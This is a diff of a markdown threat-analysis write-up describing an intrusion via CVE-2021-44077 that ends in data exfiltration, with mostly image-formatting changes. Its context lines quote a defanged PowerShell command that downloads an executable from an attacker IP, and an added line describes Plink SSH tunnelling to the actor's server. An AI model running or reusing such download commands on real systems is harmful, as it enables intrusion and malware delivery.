@@ -1,9 +1,9 @@
 # Attack Roadmap
 
 ### Will the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration
-
-<img src="AttackRoadmap.png"  width="20%" height="20%">
-
+<p align="center">
+<img src="AttackRoadmap.png"  width="20%" height="20%" align="center">
+</p>
 ## Let's Summarize Each Step
 #### 1. Exploit [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) The exploit looks very similar to a publicly available POC exploit on [GitHub](https://github.com/horizon3ai/CVE-2021-44077).
 ##### Exploit Method: RCE via two HTTP requests.
@@ -48,7 +48,10 @@
    ```
    powershell.exe (New-Object System.Net.WebClient).DownloadFile('hXXp://23.81.246[.]84/file.exe', 'c:\windows\temp\ekern.exe')
    ```
-   
-   <img src='https://private-user-images.githubusercontent.com/84778438/349634641-85dc8953-0f11-4624-85cc-49dd3170e433.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MjEyNDE5MjgsIm5iZiI6MTcyMTI0MTYyOCwicGF0aCI6Ii84NDc3ODQzOC8zNDk2MzQ2NDEtODVkYzg5NTMtMGYxMS00NjI0LTg1Y2MtNDlkZDMxNzBlNDMzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA3MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNzE3VDE4NDAyOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTNhNTY5ZWZmMzAyNTc4MjJmMTIwZDI3ZTA0ZTA2N2QxOWM4ZDdiM2NiMDk4ZmU3ZTM1NWFjYTFlMmY4ZGIzOTcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.B5SLSXUMS02tabQq-nibls930lQk0adRYWGfHGKZOEc' width="30%" height="30%">
-   
- - 
+   <p align="center">
+   <img src='https://private-user-images.githubusercontent.com/84778438/349634641-85dc8953-0f11-4624-85cc-49dd3170e433.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MjEyNDE5MjgsIm5iZiI6MTcyMTI0MTYyOCwicGF0aCI6Ii84NDc3ODQzOC8zNDk2MzQ2NDEtODVkYzg5NTMtMGYxMS00NjI0LTg1Y2MtNDlkZDMxNzBlNDMzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA3MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNzE3VDE4NDAyOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTNhNTY5ZWZmMzAyNTc4MjJmMTIwZDI3ZTA0ZTA2N2QxOWM4ZDdiM2NiMDk4ZmU3ZTM1NWFjYTFlMmY4ZGIzOTcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.B5SLSXUMS02tabQq-nibls930lQk0adRYWGfHGKZOEc' width="30%" height="30%" align="center">
+ <p>
+ 
+ - `Plink` was used in conjunction with a batch script `FXS.bat` to establish an SSH connection with the threat actor’s server on port `443` instead of `22`.
+
+
